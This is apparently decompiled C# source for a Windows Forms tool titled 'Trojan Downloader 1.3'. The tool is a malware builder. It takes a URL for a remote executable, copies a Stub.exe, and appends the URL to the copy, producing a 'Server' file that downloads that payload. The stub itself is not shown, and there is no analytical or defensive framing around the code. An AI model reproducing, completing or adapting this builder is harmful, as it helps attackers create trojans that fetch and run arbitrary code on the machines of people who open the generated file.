using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.Compatibility.VB6;

public class frmMain : Form
{
	private IContainer icontainer_0 = null;

	internal Button cmdErstellen;

	internal Label lblServer;

	internal TextBox txtSite;

	internal GroupBox GropSetings;

	private Button button1;

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_034e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0358: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmMain));
		cmdErstellen = new Button();
		lblServer = new Label();
		txtSite = new TextBox();
		GropSetings = new GroupBox();
		button1 = new Button();
		((Control)GropSetings).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)cmdErstellen).set_Location(new Point(9, 58));
		((Control)cmdErstellen).set_Name("cmdErstellen");
		((Control)cmdErstellen).set_Size(new Size(99, 24));
		((Control)cmdErstellen).set_TabIndex(3);
		((Control)cmdErstellen).set_Text(" &Create File");
		((ButtonBase)cmdErstellen).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)cmdErstellen).set_UseVisualStyleBackColor(true);
		((Control)cmdErstellen).add_Click((EventHandler)cmdErstellen_Click);
		((Control)lblServer).set_AutoSize(true);
		((Control)lblServer).set_ForeColor(SystemColors.ControlText);
		((Control)lblServer).set_Location(new Point(6, 16));
		((Control)lblServer).set_Name("lblServer");
		((Control)lblServer).set_Size(new Size(81, 13));
		((Control)lblServer).set_TabIndex(0);
		((Control)lblServer).set_Text("Download from:");
		((Control)txtSite).set_Location(new Point(9, 32));
		((Control)txtSite).set_Name("txtSite");
		((Control)txtSite).set_Size(new Size(269, 20));
		((Control)txtSite).set_TabIndex(1);
		((Control)txtSite).set_Text("http://yoursite.com/file.exe");
		((Control)GropSetings).get_Controls().Add((Control)(object)button1);
		((Control)GropSetings).get_Controls().Add((Control)(object)txtSite);
		((Control)GropSetings).get_Controls().Add((Control)(object)lblServer);
		((Control)GropSetings).get_Controls().Add((Control)(object)cmdErstellen);
		((Control)GropSetings).set_ForeColor(Color.Black);
		((Control)GropSetings).set_Location(new Point(12, 3));
		((Control)GropSetings).set_Name("GropSetings");
		((Control)GropSetings).set_Size(new Size(286, 90));
		((Control)GropSetings).set_TabIndex(2);
		GropSetings.set_TabStop(false);
		((Control)GropSetings).set_Text("Builder Settings");
		((Control)GropSetings).add_Enter((EventHandler)GropSetings_Enter);
		((Control)button1).set_Location(new Point(229, 59));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(51, 23));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("About");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(310, 103));
		((Control)this).get_Controls().Add((Control)(object)GropSetings);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("frmMain");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Trojan Downloader 1.3");
		((Form)this).add_Load((EventHandler)frmMain_Load);
		((Control)GropSetings).ResumeLayout(false);
		((Control)GropSetings).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	public frmMain()
	{
		InitializeComponent();
	}

	private void GropSetings_Enter(object sender, EventArgs e)
	{
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
	}

	private void cmdErstellen_Click(object sender, EventArgs e)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Expected O, but got Unknown
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)txtSite).get_Text() == "")
		{
			MessageBox.Show("This can't be blank");
			return;
		}
		string text = ((Control)txtSite).get_Text();
		string sourceFileName = Application.get_StartupPath() + "\\Stub.exe";
		FixedLengthString val = new FixedLengthString(100);
		val.set_Value(text);
		SaveFileDialog val2 = new SaveFileDialog();
		((FileDialog)val2).set_CheckPathExists(true);
		((FileDialog)val2).set_FileName("Server");
		((FileDialog)val2).set_Filter("Exe File (*.exe) | *.exe");
		((CommonDialog)val2).ShowDialog();
		File.Copy(sourceFileName, ((FileDialog)val2).get_FileName());
		FileStream fileStream = File.Open(((FileDialog)val2).get_FileName(), FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		BinaryWriter binaryWriter = new BinaryWriter(fileStream);
		fileStream.Position = fileStream.Length + 1L;
		binaryWriter.Write(val.get_Value());
		binaryWriter.Flush();
		binaryWriter.Close();
		MessageBox.Show("File Created", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		AboutBox1 aboutBox = new AboutBox1();
		((Control)aboutBox).Show();
	}
}
